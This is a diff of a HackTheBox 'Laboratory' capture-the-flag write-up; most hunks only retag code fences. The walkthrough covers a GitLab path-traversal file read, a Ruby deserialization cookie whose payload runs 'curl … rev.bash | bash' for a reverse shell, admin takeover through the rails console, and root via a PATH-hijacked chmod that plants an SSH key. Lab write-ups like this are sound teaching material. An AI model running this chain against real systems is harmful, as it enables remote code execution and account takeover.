@@ -13,7 +13,8 @@ published: true
 
 Initial Port scanning using `masscan` and `nmap` :
 
-```
+```console
+
 spy0x7:  ~/Documents/htb/laboratory
 → masscan -e tun0 -p1-65535 --rate 500 10.10.10.216 | tee masscan.ports
 
@@ -28,7 +29,8 @@ Discovered open port 443/tcp on 10.10.10.216
 
 ### nmap
 
-```
+```console
+
 spy0x7:  ~/Documents/htb/laboratory
 → nmap -sC -sV -p22,80,443 10.10.10.216
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-16 01:24 IST
@@ -137,7 +139,8 @@ Step 4 : We'll find the file linked to the second project issue :
 
 Clicking on it downloads the file:
 
-```shell
+```console
+
 spy0x7:  ~/Documents/htb/laboratory
 → cat passwd
 root:x:0:0:root:/root:/bin/bash
@@ -166,7 +169,8 @@ To administer RCE attack first we need to grab `/opt/gitlab/embedded/service/git
 
 `![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)`
 
-```
+```console
+
 spy0x7:  ~/Documents/htb/laboratory
 → cat secrets.yml
 # This file is managed by gitlab-ctl. Manual changes will be
@@ -201,7 +205,8 @@ Next, to build the Deserialization payload we need to spin off a replica of vuln
 
 It will take few mins to run the container to start, in a new terminal we can check the docker process and simultaneously get a shell on it.
 
-```
+```console
+
 spy0x7:  ~/Documents/htb/laboratory
 → docker ps
 CONTAINER ID        IMAGE                          COMMAND             CREATED             STATUS                             PORTS                     NAMES
@@ -253,7 +258,8 @@ cookies.signed[:cookie] = depr
 puts cookies[:cookie]
 ```
 
-```
+```console
+
 root@55c5745c3e56:/# gitlab-rails console
 --------------------------------------------------------------------------------
  GitLab:       12.8.1 (d18b43a5f5a) FOSS
@@ -275,14 +281,17 @@ irb(main):003:0> cookies = request.cookie_jar
 
 Setting up the payload, Initially when I did this box I had difficulties sending reverse shell payload directly so Here I'll curl a file `rev.bash` which contains Python reverse shell from my Web server and pipe it to bash:
 
-```
+
+```console
+
 irb(main):004:0> erb = ERB.new("<%= `curl http://10.10.14.24:8080/rev.bash | bash` %>")
 => #<ERB:0x00007ff699607498 @safe_level=nil, @src="#coding:UTF-8\n_erbout = +''; _erbout.<<(( `curl http://10.10.14.24:8080/rev.bash | bash` ).to_s); _erbout", @encoding=#<Encoding:UTF-8>, @frozen_string=nil, @filename=nil, @lineno=0>
 ```
 
 Here next two commands tries to fetch the file and run the payload here itself, so we shouldn't run the webserver while executing these commands, also In case you are sending reverse shell payload directly then it's advised not to run the listener while sending these commands:
 
-```
+```console
+
 irb(main):005:0> depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -302,7 +311,8 @@ DEPRECATION WARNING: @result is deprecated! Call result.is_a? instead of @result
 
 Finally generating cookie value:
 
-```ruby
+```console
+
 irb(main):007:0> puts cookies[:cookie]
 BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kibiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBjdXJsIGh0dHA6Ly8xMC4xMC4xNC4yNDo4MDgwL3Jldi5iYXNoIHwgYmFzaGAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--c13c402abdc9f0aabfd22f5544ab2d713e509334
 => nil
@@ -313,7 +323,8 @@ Step 5 : Execution
 
 Now that we have the cookie value ready we will run the `curl` command to drop us a reverse shell:
 
-```
+```console
+
 spy0x7:  ~/Documents/htb/laboratory
 → curl -vvv -k 'https://git.laboratory.htb/users/sign_in' -b "experimentation_subject_id=BAhvO
 kBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5
@@ -328,7 +339,9 @@ Make sure to start the webserver and nc listener before executing the curl comma
 
 ![shell](/assets/Laboratory/shell.png)
 
-```
+
+```console
+
 spy0x7:  ~/Documents/htb/laboratory
 → nc -lvnp 4444
 Ncat: Version 7.91 ( https://nmap.org/ncat )
@@ -349,7 +362,8 @@ git@git:~/gitlab-rails/working$
 
 Initial enumeration confirms we are inside a docker container:
 
-```
+```console
+
 git@git:/$ hostname -i
 172.17.0.2
 git@git:/$ hostname
@@ -358,7 +372,8 @@ git.laboratory.htb
 
 Also, there is `.dockerenv` to confirm the same
 
-```
+```console
+
 git@git:/$ ls -la
 total 88
 drwxr-xr-x   1 root root 4096 Jul  2  2020 .
@@ -385,7 +400,8 @@ Here are some Cheatsheet which I referred initially : [**Cheatsheet1**](https://
 
 Firstly, We can grant ourself admin privilege:
 
-```
+```console
+
 git@git:~$ gitlab-rails console
 --------------------------------------------------------------------------------
  GitLab:       12.8.1 (d18b43a5f5a) FOSS
@@ -413,7 +429,8 @@ Now we can see admin icon on our account, as a result we can now access Dexter's
 
 We saw Dexter is the only admin, so we can even reset his password:
 
-```
+```console
+
 git@git:/$ gitlab-rails console
 --------------------------------------------------------------------------------
  GitLab:       12.8.1 (d18b43a5f5a) FOSS
@@ -442,7 +459,8 @@ Now we can login to GitLab as dexter where we see another Project `SecureDocker`
 
 Inside project, first thing we find is an `todo.txt` which seems to be some kind of pending task list:
 
-```
+```console
+
 # DONE: Secure docker for regular users
 ### DONE: Automate docker security on startup
 # TODO: Look into "docker compose"
@@ -457,7 +475,8 @@ But what's more interesting is that folder dexter contains an `.ssh` folder with
 
 Using this key we can SSH as dexter:
 
-```
+```console
+
 spy0x7:  ~/Documents/htb/laboratory
 → ssh -i id_rsa dexter@10.10.10.216
 dexter@laboratory:~$ id
@@ -468,7 +487,8 @@ dexter
 
 Grabbing `user.txt`:
 
-```
+```console
+
 dexter@laboratory:~$ cat user.txt
 7c447991fdff874*****************
 
@@ -482,7 +502,8 @@ Searching for `SUID` binaries we find one in `/usr/local/bin/`
 
 > /usr/local/bin is the location for all add-on executables that you add to the system to be used as common system files by all users but, are not official files supported by the OS.
 
-```
+```console
+
 dexter@laboratory:~$ find / -perm -u=s -type f 2>/dev/null | grep -v 'snap' | xargs ls -la
 -rwsr-sr-x 1 daemon daemon      55560 Nov 12  2018 /usr/bin/at
 -rwsr-xr-x 1 root   root        85064 May 28  2020 /usr/bin/chfn
@@ -507,14 +528,16 @@ dexter@laboratory:~$ find / -perm -u=s -type f 2>/dev/null | grep -v 'snap' | xa
 
 But on running it nothing happens:
 
-```
+```console
+
 dexter@laboratory:~$ docker-security
 dexter@laboratory:~$
 ```
 
 So we can run it with `ltrace` :
 
-```
+```console
+
 dexter@laboratory:~$ ltrace docker-security
 setuid(0)                                                                                                                         = -1
 setgid(0)                                                                                                                         = -1
@@ -531,14 +554,16 @@ system("chmod 660 /var/run/docker.sock"/tmp/chmod: 1: cannot create /root/.ssh/a
 
 Looking at the trace, binary is calling `system("chmod 700 /usr/bin/docker")`. Now the interesting thing to notice is that `chmod` is not called from it's absolute path which should be `/usr/bin/chmod`
 
-```
+```console
+
 dexter@laboratory:~$ which chmod
 /usr/bin/chmod
 ```
 
 Current path :
 
-```
+```console
+
 dexter@laboratory:~$ echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
 ```
@@ -547,7 +572,8 @@ So we can forge `chmod` of our own, update the path and confuse the application 
 
 I'll create a ssh key using `ssh-keygen -f spy0x7`:
 
-```
+```console
+
 dexter@laboratory:/tmp$ cat chmod
 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFJ4KUY9Dzy4UKYRwT+ORSIGW1W2YSKQrqIlNfRksWqWOz3bCJCE5gImrgx/lsL/kItrEvy9js4nQ1zmUrJ6kSYU7[..SNIP..]Rws4b8UeKpU+ft6Uk root@spy0x7" > /root/.ssh/authorized_keys
 
@@ -557,14 +583,15 @@ dexter@laboratory:/tmp$ export PATH=/tmp:$PATH
 
 Updated PATH:
 
-```
+```console
+
 dexter@laboratory:/tmp$ echo $PATH
 /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
 ```
 
 Here the first path is `/tmp` so next time when we run the binary it will first go inside `/tmp`, fetch and run our malicious `chmod`:
 
-```
+```console
 dexter@laboratory:/tmp$ /usr/local/bin/docker-security
 ```
 
@@ -572,7 +599,7 @@ This should have successfully copied our public ssh key to `/root/.ssh/authorize
 
 ### SSH - root
 
-```
+```console
 spy0x7:  ~/Documents/htb/docker
 → ssh -i spy0x7 root@10.10.10.216
 root@laboratory:~# id
@@ -583,10 +610,9 @@ root
 
 Grabbing `root.txt`:
 
-```
+```console
 root@laboratory:~# cat root.txt
 0bc02b1afb2b28******************
-
 ```
 
 And we pwned the Box !
